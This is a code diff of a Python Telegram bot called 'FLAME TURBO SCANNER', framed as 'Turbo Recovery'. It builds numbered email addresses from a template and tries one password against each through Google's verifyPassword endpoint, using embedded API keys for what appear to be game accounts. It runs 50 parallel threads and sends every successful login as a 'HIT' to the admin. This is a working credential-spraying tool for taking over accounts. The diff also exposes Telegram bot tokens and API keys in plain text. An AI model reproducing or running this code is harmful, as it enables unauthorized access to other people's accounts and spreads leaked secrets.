@@ -6,25 +6,24 @@ from flask import Flask
 import os
 from concurrent.futures import ThreadPoolExecutor
 
-# --- RENDER HEALTH CHECK SERVER ---
+# --- RENDER WEB SERVER ---
 app = Flask('')
 
 @app.route('/')
-def home():
-    return "⚡ FLAME TURBO SCANNER IS ONLINE!"
+def home(): 
+    return "⚡ FLAME TURBO SCANNER ONLINE"
 
 def run_flask():
-    # Render നൽകുന്ന PORT തന്നെ ഉപയോഗിക്കുന്നു (ഇത് നിർബന്ധമാണ്)
+    # Render port binding fix
     port = int(os.environ.get("PORT", 8080))
     app.run(host='0.0.0.0', port=port)
 
-# --- BOT CONFIG ---
-# നിന്റെ പുതിയ ടോക്കൺ ഇവിടെ ആഡ് ചെയ്തിട്ടുണ്ട്
-TOKEN = "8574711169:AAEpY7ydcHy1nYoZnNVLi4w63HHnxNqamhM"
-bot = telebot.TeleBot(TOKEN, threaded=True)
+# --- CONFIG ---
+# Ninte puthiya valid token
+TOKEN = "8574711169:AAGk87biel9UdUGxFTq9cDW4yOIiz6egRew"
+bot = telebot.TeleBot(TOKEN)
 
-ADMIN_ID = 7212602902 
-
+ADMIN_ID = 7212602902
 API_KEYS = {
     "CPM1": "AIzaSyAe_aOVT1gSfmHKBrorFvX4fRwN5nODXVA", 
     "CPM2": "AIzaSyCQDz9rgjgmvmFkvVfmvr2-7fT4tfrzRRQ"
@@ -32,61 +31,64 @@ API_KEYS = {
 
 user_states = {}
 session = requests.Session()
-adapter = requests.adapters.HTTPAdapter(pool_connections=100, pool_maxsize=100)
-session.mount('https://', adapter)
 
 # --- LOGIN LOGIC ---
-def login_acc(email, password, version="CPM2"):
+def login_acc(email, password):
     try:
-        url = f"https://www.googleapis.com/identitytoolkit/v3/relyingparty/verifyPassword?key={API_KEYS[version]}"
-        r = session.post(url, json={"email": email, "password": password, "returnSecureToken": True}, timeout=6)
-        if r.status_code == 200: return email
-    except: return None
-    return None
+        url = f"https://www.googleapis.com/identitytoolkit/v3/relyingparty/verifyPassword?key={API_KEYS['CPM2']}"
+        r = session.post(url, json={"email": email, "password": password, "returnSecureToken": True}, timeout=5)
+        return email if r.status_code == 200 else None
+    except: 
+        return None
 
-# --- HANDLERS ---
+# --- BOT HANDLERS ---
 @bot.message_handler(commands=['start'])
 def start(message):
-    if message.from_user.id != ADMIN_ID: return bot.send_message(message.chat.id, "🚫 Access Denied!")
-    markup = types.InlineKeyboardMarkup()
-    markup.add(types.InlineKeyboardButton("🔍 Start Turbo Recovery", callback_data="mode_recover"))
-    bot.send_message(message.chat.id, "🔥 **FLAME TURBO MASTER**", reply_markup=markup)
+    if message.from_user.id != ADMIN_ID: return
+    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
+    markup.add("🚀 Turbo Recovery")
+    bot.send_message(message.chat.id, "🔥 **FLAME TURBO MASTER ACTIVE**", reply_markup=markup)
 
-@bot.callback_query_handler(func=lambda call: call.data == "mode_recover")
-def handle_recover(call):
-    msg = bot.send_message(call.message.chat.id, "📧 Enter Format: (Ex: `cpm_{}_@gmail.com`)")
-    bot.register_next_step_handler(msg, get_format)
-
-def get_format(message):
-    user_states[message.chat.id] = {'format': message.text.strip()}
-    msg = bot.send_message(message.chat.id, "🔢 Enter Range: (Ex: `1000:2000`)")
+@bot.message_handler(func=lambda m: m.text == "🚀 Turbo Recovery")
+def ask_format(message):
+    msg = bot.send_message(message.chat.id, "📧 **Format ayakkuka:**\n(Ex: `cpmegy_{}_@gmail.com`)")
     bot.register_next_step_handler(msg, get_range)
 
 def get_range(message):
+    user_states[message.chat.id] = {'format': message.text.strip()}
+    msg = bot.send_message(message.chat.id, "🔢 **Range ayakkuka:**\n(Ex: `1000:2000`)")
+    bot.register_next_step_handler(msg, get_pass)
+
+def get_pass(message):
     try:
         s, e = map(int, message.text.split(':'))
-        user_states[message.chat.id]['start'], user_states[message.chat.id]['end'] = s, e
-        msg = bot.send_message(message.chat.id, "🔑 Enter Password:")
-        bot.register_next_step_handler(msg, run_turbo)
-    except: bot.send_message(message.chat.id, "❌ Format error! (Ex: 1000:2000)")
+        user_states[message.chat.id]['s'] = s
+        user_states[message.chat.id]['e'] = e
+        msg = bot.send_message(message.chat.id, "🔑 **Password ayakkuka:**")
+        bot.register_next_step_handler(msg, start_scan)
+    except:
+        bot.send_message(message.chat.id, "❌ Format error! (Ex: 1000:5000)")
 
-def run_turbo(message):
-    cid, pwd = message.chat.id, message.text.strip()
+def start_scan(message):
+    cid = message.chat.id
+    pwd = message.text.strip()
     data = user_states.get(cid)
-    bot.send_message(cid, f"🚀 Scanning {data['start']} to {data['end']}...")
+    bot.send_message(cid, f"⚡ **Scanning {data['s']} to {data['e']}...**")
 
-    def task():
-        emails = [data['format'].replace("{}", str(i)) for i in range(data['start'], data['end'] + 1)]
-        with ThreadPoolExecutor(max_workers=50) as executor:
-            results = list(executor.map(lambda e: login_acc(e, pwd), emails))
+    def run():
+        emails = [data['format'].replace("{}", str(i)) for i in range(data['s'], data['e'] + 1)]
         
-        found = [res for res in results if res]
-        for f in found:
-            bot.send_message(cid, f"✅ **HIT:** `{f}`")
-            bot.send_message(ADMIN_ID, f"🔔 **LOG:** `{f}` Found!")
-        bot.send_message(cid, f"🏁 Done! Found: {len(found)}")
+        # Speed 2x aakkan workers 50 aakki
+        with ThreadPoolExecutor(max_workers=50) as executor:
+            hits = list(filter(None, executor.map(lambda e: login_acc(e, pwd), emails)))
+        
+        for h in hits:
+            bot.send_message(cid, f"✅ **HIT:** `{h}`")
+            bot.send_message(ADMIN_ID, f"🔔 **LOG:** `{h}` Found!")
+        
+        bot.send_message(cid, f"🏁 **Done! Total Hits: {len(hits)}**")
 
-    Thread(target=task).start()
+    Thread(target=run).start()
 
 # --- RUNNER ---
 if __name__ == "__main__":
@@ -94,6 +96,7 @@ if __name__ == "__main__":
     t = Thread(target=run_flask)
     t.daemon = True
     t.start()
+    
     # Bot Start
-    print("Bot is alive...")
+    print("Bot is starting...")
     bot.infinity_polling(skip_pending=True)
